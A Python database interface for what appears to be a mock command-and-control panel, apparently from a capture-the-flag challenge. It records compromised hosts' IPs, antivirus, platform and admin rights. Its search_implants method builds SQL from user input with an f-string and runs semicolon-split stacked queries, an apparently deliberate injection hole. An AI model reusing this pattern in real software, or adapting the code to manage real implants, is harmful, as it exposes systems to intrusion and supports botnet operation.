from application.util.general import generate, generate_random_unix_timestamp
from datetime import datetime
import time, bcrypt, html, mysql.connector

class MysqlInterface:
    def __init__(self, config):
        self.connection = None
        while self.connection is None:
            try:
                self.connection = mysql.connector.connect(
                    host=config["MYSQL_HOST"],
                    database=config["MYSQL_DATABASE"],
                    user=config["MYSQL_USER"],
                    password=config["MYSQL_PASSWORD"]
                )
            except mysql.connector.Error as err:
                print(f"Failed to connect: {err}")
                print("Retrying in 5 seconds")
                time.sleep(5)
    

    def __del__(self):
        self.close()


    def close(self):
        if self.connection is not None:
            self.connection.close()


    def query(self, query, args=(), one=False, multi=False):
        cursor = self.connection.cursor()
        results = None

        if not multi:
            cursor.execute(query, args)
            rv = [dict((cursor.description[idx][0], value)
                for idx, value in enumerate(row)) for row in cursor.fetchall()]
            results = (rv[0] if rv else None) if one else rv
        else:
            results = []
            queries = query.split(";")
            for statement in queries:
                cursor.execute(statement, args)
                rv = [dict((cursor.description[idx][0], value)
                    for idx, value in enumerate(row)) for row in cursor.fetchall()]
                results.append((rv[0] if rv else None) if one else rv)
                self.connection.commit()
    
        return results

    
    def register_implant(self, ip_address, region, version, antivirus, arch, platform, hostname, rights, image_url, random_date=False):
        identifier = generate(32)
        token = generate(32)
        date = generate_random_unix_timestamp() if random_date else datetime.now()
        self.query("INSERT INTO implants(identifier, token, ip_address, region, version, antivirus, arch, platform, hostname, rights, image_url, last_login, installation_date) VALUES(%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)", (
            identifier, 
            token, 
            ip_address, 
            region, 
            version, 
            antivirus,
            arch, 
            platform, 
            hostname,
            rights,
            image_url,
            date,
            date
        ,))
        self.connection.commit()
        return {
            "identifier": identifier,
            "token": token
        }
    
    
    def update_implant(self, identifier, ip_address, region, version, antivirus, arch, platform, hostname, rights, image_url):
        self.query("UPDATE implants SET ip_address = %s, region = %s, version = %s, antivirus = %s, arch = %s, platform = %s, hostname = %s, rights = %s, image_url = %s, last_login = %s WHERE identifier = %s", (
            ip_address, 
            region, 
            version, 
            antivirus, 
            arch, 
            platform, 
            hostname, 
            rights,
            image_url,
            datetime.now(),
            identifier
        ,))
        self.connection.commit()
        return True
    
    
    def check_implant(self, identifier, token):
        implant = self.query("SELECT identifier FROM implants WHERE identifier = %s AND token = %s", (identifier, token,), one=True)

        if not implant:
            return False
        
        return True
    
    
    def fetch_implant_statistics(self):
        regions = self.query("SELECT region, COUNT(*) AS count FROM implants GROUP BY region")
        region_count = self.query("SELECT COUNT(DISTINCT region) AS region_count FROM implants", one=True)
        platforms = self.query("SELECT platform, COUNT(*) AS count FROM implants GROUP BY platform")
        rights = self.query("SELECT rights, COUNT(*) AS count FROM implants GROUP BY rights")
        
        implant_statistics = self.query("""
        SELECT
            COUNT(*) AS count_total,
            SUM(CASE WHEN last_login >= NOW() - INTERVAL 3 HOUR THEN 1 ELSE 0 END) AS count_online_3h,
            SUM(CASE WHEN last_login >= NOW() - INTERVAL 24 HOUR THEN 1 ELSE 0 END) AS count_online_24h,
            SUM(CASE WHEN last_login >= NOW() - INTERVAL 7 DAY THEN 1 ELSE 0 END) AS count_online_7d,
            SUM(CASE WHEN last_login >= NOW() - INTERVAL 7 DAY THEN 0 ELSE 1 END) AS count_offline,
            SUM(CASE WHEN last_login >= NOW() - INTERVAL 7 DAY THEN 1 ELSE 0 END) AS count_total_online
        FROM implants;
        """, one=True)
        
        statistics = {}
        statistics["total_implants"] = implant_statistics["count_total"]
        statistics["implants_online"] = implant_statistics["count_total_online"]
        statistics["implants_online_3h"] = implant_statistics["count_online_3h"]
        statistics["implants_online_24h"] = implant_statistics["count_online_24h"]
        statistics["implants_online_7d"] = implant_statistics["count_online_7d"]
        statistics["implants_offline"] = implant_statistics["count_offline"]
        statistics["total_regions"] = region_count["region_count"]
        statistics["region_data"] = regions
        statistics["windows_systems"] = platforms[0]["count"]
        statistics["linux_systems"] = platforms[1]["count"]
        statistics["osx_systems"] = platforms[2]["count"]
        statistics["users"] = int((rights[0]["count"] / implant_statistics["count_total"]) * 100)
        statistics["admins"] = int((rights[1]["count"] / implant_statistics["count_total"]) * 100)

        return statistics
    
    
    def fetch_implant_data(self):
        implants = self.query("SELECT * FROM implants")

        if len(implants) < 1:
            return False
        
        return implants
    

    def fetch_implant_by_identifier(self, identifier):
        implant = self.query("SELECT * FROM implants WHERE identifier = %s", (identifier,), one=True)

        if not implant:
            return False
        
        return implant

    
    def search_implants(self, column, query_eq, query_like):
        available_columns = [
            "identifier",
            "region",
            "platform",
            "hostname",
            "installation_date"
            "version",
            "antivirus"
        ]

        if not column in available_columns:
            return False

        query_eq = html.escape(query_eq)
        query_like = html.escape(query_like)

        implants = self.query(f"SELECT * FROM implants WHERE {column} = '{query_eq}' OR {column} LIKE '{query_like}%'", multi=True)[0]
        
        if len(implants) < 1:
            return False
        
        return implants
    
    
    def register_user(self, username, password, account_type):
        password_bytes = password.encode("utf-8")
        salt = bcrypt.gensalt()
        password_hash = bcrypt.hashpw(password_bytes, salt).decode()
        self.query("INSERT INTO users(username, password, account_type) VALUES(%s, %s, %s)", (username, password_hash, account_type,))
        self.connection.commit()
        return True
    
    
    def check_user(self, username, password):
        user = self.query("SELECT password FROM users WHERE username = %s", (username,), one=True)

        if not user:
            return False
        
        password_bytes = password.encode("utf-8")
        password_encoded = user["password"].encode("utf-8")
        matched = bcrypt.checkpw(password_bytes, password_encoded)
        
        if matched:
            return True
        
        return False
    
    
    def fetch_user_by_username(self, username):
        user = self.query("SELECT * FROM users WHERE username = %s", (username,), one=True)

        if not user:
            return False
        
        return user
    
    
    def register_token_provider(self, host_url):
        self.query("INSERT INTO trusted_external_token_providers(host_url) VALUES(%s)", (host_url,))
        self.connection.commit()
        return True
    
    
    def fetch_token_providers(self):
        providers = self.query("SELECT * FROM trusted_external_token_providers")

        if len(providers) < 1:
            return False
        
        return providers